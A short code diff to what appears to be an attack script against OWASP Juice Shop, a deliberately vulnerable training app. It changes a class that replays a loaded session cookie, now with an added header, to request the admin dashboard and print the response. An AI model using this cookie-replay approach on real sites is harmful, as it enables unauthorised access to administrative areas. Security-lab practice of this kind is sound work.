@@ -10,14 +10,14 @@ class admin_section(a.attack_inter):
 
     def generator(self):
         cookie = a.load_cookie()
-        return cookie
+        header = HEADER
+        return cookie,header
 
     def run(self):
-
-        cookie = self.generator()
+        cookie,header = self.generator()
         if cookie:
-            response = self.juice_session.get(self.url, cookies=cookie )
-            #print(response.text)
+            response = self.juice_session.get(self.url, cookies=cookie, headers=header)
+            print(response.text)
             if response.status_code == 304:
                 print("successfully get admin dashboard")
                 print(response.text)
